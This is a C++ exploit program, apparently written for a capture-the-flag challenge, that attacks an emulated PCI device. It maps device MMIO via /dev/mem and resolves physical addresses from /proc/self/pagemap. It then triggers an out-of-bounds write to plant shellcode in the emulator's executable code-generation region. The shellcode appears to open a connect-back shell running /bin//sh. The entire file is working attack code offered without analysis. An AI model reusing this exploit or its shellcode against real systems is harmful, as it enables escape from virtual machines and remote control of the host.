#include <iostream>
#include <fcntl.h>
#include <stdint.h>
#include <sys/mman.h>
#include <assert.h>
#include <unistd.h>
using namespace std;

#define PCI_MMIO_OFFSET	0xfea00000
#define PCI_MMIO_SIZE	0xfffff
int		mem_fd;
void	*mmio;

void mmap_mmio()
{
	mmio = mmap(NULL,
				PCI_MMIO_SIZE,
				PROT_READ|PROT_WRITE,
				MAP_SHARED,
				mem_fd,
				PCI_MMIO_OFFSET
				);
	assert(mmio > 0);
}

void set_size(uint64_t size)
{
	*(uint64_t *)((uintptr_t)mmio + 16) = size;
}

void set_offset(uint64_t offset)
{
	*(uint64_t *)((uintptr_t)mmio + 8) = offset;
}

void set_addr(uint64_t addr)
{
	*(uint64_t *)((uintptr_t)mmio + 24) = addr;
}

void trigger_oob()
{
	*(uint64_t *)((uintptr_t)mmio + 0x20) = 0xF62D;
}

uint64_t virt2phys(void* p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd == -1)
        printf("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(fd, offset, SEEK_SET);

    uint64_t phys;
    if (read(fd, &phys, 8 ) != 8)
        printf("read");

    // Assert page present
    assert(phys & (1ULL << 63));

    phys = (phys & ((1ULL << 54) - 1)) * 0x1000;
    return phys;
}

void overwrite(uint64_t* from, uint64_t offset, uint64_t size)
{
	uint64_t phys_p = virt2phys(from);
	set_addr(phys_p);
	set_offset(offset);
	set_size(size);
	trigger_oob();
}

int main()
{
	cout << "PCI device exploitation!" << endl;
	mem_fd = open("/dev/mem", O_RDWR);
	assert(mem_fd > 0);
	mmap_mmio();

	uint64_t *shellcode = (uint64_t *)mmap(NULL,
							0x1000,
							PROT_READ|PROT_WRITE,
							MAP_PRIVATE|MAP_ANONYMOUS,
							-1,
							0);
	mlock(shellcode, 0x1000);
	printf("Shellcode is placed here : %p\n", shellcode);
	assert(shellcode > 0);

	int i = 0;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] = 0x9090909090909090;
	shellcode[i++] =  0x16a5f026a58296a;
	shellcode[i++] =  0x48c58948050f995e;
	shellcode[i++] =  0x1010101010101b8;
	shellcode[i++] =  0x5d100103b8485002;
	shellcode[i++] =  0x240431480301017e;
	shellcode[i++] =  0x106aef8948582a6a;
	shellcode[i++] =  0x8948050fe689485a;
	shellcode[i++] =  0x50f58216af631ef;
	shellcode[i++] =  0x216a5e016aef8948;
	shellcode[i++] =  0x26aef8948050f58;
	shellcode[i++] =  0x686a050f58216a5e;
	shellcode[i++] =  0x2f2f6e69622fb848;
	shellcode[i++] =  0x7268e7894850732f;
	shellcode[i++] =  0x101243481010169;
	shellcode[i++] =  0x5e086a56f6310101;
	shellcode[i++] =  0x31e6894856e60148;
	shellcode[i++] =  0xc3050f583b6ad2;
	// We will be trying to go oob and target a RWX segment.
	// This was the region that TCG (Tiny Code Generator) use.
	// We will setup values to go oob and place our shellcode there.
	/*shellcode[0] = 'A';
	shellcode[1] = 'A';
	shellcode[2] = 'A';
	shellcode[3] = 'A';
	shellcode[4] = 'A';
	shellcode[5] = 'A';
	shellcode[6] = 'A';*/

	overwrite(shellcode, 0xffffffffbb3005f0, 0x1000);
}